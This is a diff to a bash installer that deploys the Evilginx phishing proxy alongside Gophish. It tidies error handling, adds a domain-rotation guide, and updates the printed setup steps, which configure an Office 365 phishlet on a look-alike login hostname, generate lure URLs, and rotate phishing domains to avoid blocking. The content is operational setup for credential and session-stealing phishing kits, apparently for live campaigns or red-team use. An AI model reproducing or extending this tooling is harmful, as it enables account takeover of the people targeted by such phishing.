@@ -939,6 +939,7 @@ WRAPPEREOF
     log_info "Copying documentation to $INSTALL_BASE..."
     cp "$BUILD_DIR/README.md" "$INSTALL_BASE/" 2>/dev/null || true
     cp "$BUILD_DIR/DEPLOYMENT.md" "$INSTALL_BASE/" 2>/dev/null || true
+    cp "$BUILD_DIR/DOMAIN-ROTATION-GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
     cp "$BUILD_DIR/LICENSE" "$INSTALL_BASE/" 2>/dev/null || true
     cp "$BUILD_DIR/cloudflare-workers-deployment.md" "$INSTALL_BASE/" 2>/dev/null || true
     
@@ -1148,7 +1149,7 @@ EOF
 #!/bin/bash
 if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
 echo "Stopping systemd service to run interactively..."
-systemctl stop evilginx
+systemctl stop evilginx 2>/dev/null || true
 echo ""
 echo "Starting Evilginx in interactive mode..."
 echo "Press Ctrl+C to stop, then run 'evilginx-start' to resume service mode"
@@ -1156,8 +1157,8 @@ echo ""
 evilginx -c /etc/evilginx
 
 # Ensure permissions are restored to service user if root modified anything
-echo "Restoring configuration ownership to $SERVICE_USER..."
-chown -R "$SERVICE_USER:$SERVICE_USER" /etc/evilginx
+echo "Restoring configuration ownership to evilginx..."
+chown -R evilginx:evilginx /etc/evilginx 2>/dev/null || true
 EOF
     chmod +x /usr/local/bin/evilginx-console
     
@@ -1208,7 +1209,7 @@ display_completion() {
     echo "  • Gophish Database:     $CONFIG_DIR/gophish.db"
     echo "  • Access Remotely:      ssh -L 3333:127.0.0.1:3333 your-vps-ip"
     echo ""
-    echo "  ${GREEN}No need to specify -p or -t flags anymore!${NC}"
+    echo -e "  ${GREEN}No need to specify -p or -t flags anymore!${NC}"
     echo ""
     
     echo -e "${CYAN}Available Commands:${NC}"
@@ -1234,10 +1235,9 @@ display_completion() {
     echo "   Run: evilginx-console"
     echo ""
     echo "2. In the Evilginx console, configure:"
-    echo "   config domain yourdomain.com"
+    echo "   domains set yourdomain.com"
     echo "   config ipv4 external <YOUR_SERVER_IP>"
     echo "   config autocert on"
-    echo "   config lure_strategy realistic"
     echo ""
     echo "3. Enable a phishlet:"
     echo "   phishlets hostname o365 login.yourdomain.com"
@@ -1247,7 +1247,12 @@ display_completion() {
     echo "   lures create o365"
     echo "   lures get-url 0"
     echo ""
-    echo "5. Exit console (Ctrl+C) and start service:"
+    echo "5. (Optional) Set up domain rotation:"
+    echo "   domains add yourdomain2.com"
+    echo "   domains rotation enable on"
+    echo "   See: /opt/evilginx/DOMAIN-ROTATION-GUIDE.md"
+    echo ""
+    echo "6. Exit console (Ctrl+C) and start service:"
     echo "   evilginx-start"
     echo ""
     
@@ -1263,6 +1268,7 @@ display_completion() {
     
     echo -e "${GREEN}Documentation:${NC}"
     echo "  • Deployment Guide:     /opt/evilginx/DEPLOYMENT.md"
+    echo "  • Domain Rotation:      /opt/evilginx/DOMAIN-ROTATION-GUIDE.md"
     echo "  • README:               /opt/evilginx/README.md"
     echo ""
     
